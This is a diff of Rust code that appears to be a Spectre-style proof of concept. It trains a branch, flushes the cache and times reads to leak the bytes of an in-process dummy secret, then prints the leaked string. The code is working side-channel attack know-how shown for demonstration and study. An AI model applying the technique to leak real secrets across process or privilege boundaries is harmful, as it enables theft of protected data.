@@ -20,9 +20,9 @@ static mut LATENCIES: [u64; 256] = [0; 256];
 
 static mut BASE_ADDR: usize = 0;
 static mut NB_CYCLES: u64 = 0;
-static SPECTRE_LIMIT: u64 = 15;
-static SECRET: &[u8] = "000000000000000ILIKEDEADBEEF".as_bytes();
-static OTHER_SECRET: u64 = 0xfedcba9876543210;
+static mut SPECTRE_LIMIT: u64 = 15;
+static mut SECRET: &[u8] = "000000000000000ILIKEDEADBEEF".as_bytes();
+static mut OTHER_SECRET: u64 = 0xfedcba9876543210;
 
 extern "C" fn handle_sigsegv(
     signal: libc::c_int,
@@ -173,13 +173,10 @@ unsafe fn spectre_test(i: usize) {
 }
 
 unsafe fn spectre_attack() {
+    let mut string = Vec::new();
     for i in 0..50 {
         let mut res = Vec::with_capacity(25);
         for _ in 0..25 {
-            //let val = (Wrapping(&SECRET[0] as *const u8 as usize)
-            //    - Wrapping(SECRET as *const [u8] as *const u8 as usize)
-            //    + Wrapping(i))
-            //.0;
             // training phase
             for i in 0..5_000_000 {
                 spectre_test(i % 15);
@@ -187,24 +184,21 @@ unsafe fn spectre_attack() {
 
             // attack phase
             flush_measurement_area();
-            std::arch::x86_64::_mm_prefetch(
-                &SECRET[0] as *const u8 as *const i8,
-                std::arch::x86_64::_MM_HINT_T0,
-            );
-            std::arch::x86_64::_mm_prefetch(
-                &SECRET[15] as *const u8 as *const i8,
-                std::arch::x86_64::_MM_HINT_T0,
-            );
             std::arch::x86_64::_mm_clflush(&SPECTRE_LIMIT as *const u64 as *const u8);
-            asm!("mfence", "lfence");
 
-            spectre_test(i);
+            let val = (Wrapping(&SECRET[0] as *const u8 as usize)
+                - Wrapping(SECRET as *const [u8] as *const u8 as usize)
+                + Wrapping(i))
+            .0;
+
+            spectre_test(val);
 
             res.push(measure_byte().unwrap_or(0));
         }
-        //println!("{:?}", res.iter().max());
-        println!("{:?}", res);
+        string.push(*res.iter().max().unwrap());
     }
+
+    println!("{}", String::from_utf8_unchecked(string));
 }
 
 fn read_ptr(preload_op: unsafe fn(), target_adress: usize) -> usize {
@@ -241,7 +235,6 @@ fn setup_measurements() {
         read_flushed_time /= NB_CYCLES_TRAIN;
 
         NB_CYCLES = read_cached_time + (read_flushed_time - read_cached_time) / 2;
-        NB_CYCLES = 180;
 
         println!(
             "time to read a:\n- cached entry: {}\n- cold entry: {}\nFixing the treshold at {} cycles",
